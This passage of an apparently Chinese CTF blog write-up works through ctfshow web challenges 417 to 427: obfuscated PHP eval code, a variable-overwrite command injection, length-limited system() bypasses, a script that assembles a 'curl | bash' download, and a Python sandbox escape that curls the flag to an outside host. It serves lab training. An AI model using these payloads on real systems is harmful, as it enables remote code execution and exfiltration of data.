class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$CBhSfw</span>(<span class="string">&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>调试一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$log</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf &#x27;</span>.<span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line">FLAG_NOT_HERE</span><br></pre></td></tr></table></figure><p>注意代码</p><p>给的后门没法用，需要变量覆盖然后利用shell_exec</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure><p>然后访问flag.txt即可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141929631.png" alt="image-20220415141929631"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141935770.png" alt="image-20220415141935770"></p><h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=`cp f* f.txt`;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415142122553.png" alt="image-20220415142122553"></p><h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ls找了几个目录发现在&#x2F;var&#x2F;www下（ls …&#x2F;）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl ..<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>还有一种方法，可以参考下大佬写的<a href="https://www.cnblogs.com/-chenxs/p/11981586.html">文章</a><br> 比如我们想执行 cat index.php,可以依次执行如下命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;php\\</span><br><span class="line">&gt;dex.\\</span><br><span class="line">&gt;\ in\\</span><br><span class="line">&gt;cat\\</span><br></pre></td></tr></table></figure><p>接着执行ls -t &gt;0<br> 这样的话文件0中的内容就是 cat index.php<br> 最后利用sh 0 来执行就可以了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;sh &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2x\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;xxx.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;9x.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;1\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;4\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;curl\\&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;&gt;cu\\&#x27;,</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in payload:</span><br><span class="line">    <span class="comment"># assert len(i) &lt;= 8</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://6171141f-4d7c-447c-b0f6-1c92f0abd9be.chall.ctf.show/&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">print</span>(i)</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure><h1 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure><h1 id="we4b23"><a href="#we4b23" class="headerlink" title="we4b23"></a>we4b23</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415143111800.png" alt="image-20220415143111800"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面的题都是python的命令执行的，因为下面代码中的return需要返回的是字符串，所以不是字符串的我们就用str函数转换一下就好了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">?code=os.popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h1 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h1 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> not in code:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span 